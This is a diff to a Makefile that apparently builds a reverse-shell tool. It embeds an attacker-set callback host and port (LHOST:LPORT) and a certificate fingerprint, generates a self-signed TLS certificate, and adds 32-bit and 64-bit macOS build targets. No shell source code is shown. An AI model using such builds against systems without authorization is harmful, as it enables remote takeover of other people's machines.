@@ -10,7 +10,7 @@ WIN_LDFLAGS=--ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPri
 all: clean depends shell
 
 depends:
-	openssl req -subj '/CN=yourcn.com/O=YourOrg/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
+	openssl req -subj '/CN=acme.com/O=ACME/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
 	cat ${SRV_KEY} >> ${SRV_PEM}
 
 shell:
@@ -28,7 +28,10 @@ windows32:
 windows64:
 	GOOS=windows GOARCH=amd64 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WINDOWS} ${SRC}
 
-macos:
+macos32:
+	GOOS=darwin GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}
+
+macos64:
 	GOOS=darwin GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}
 
 clean:
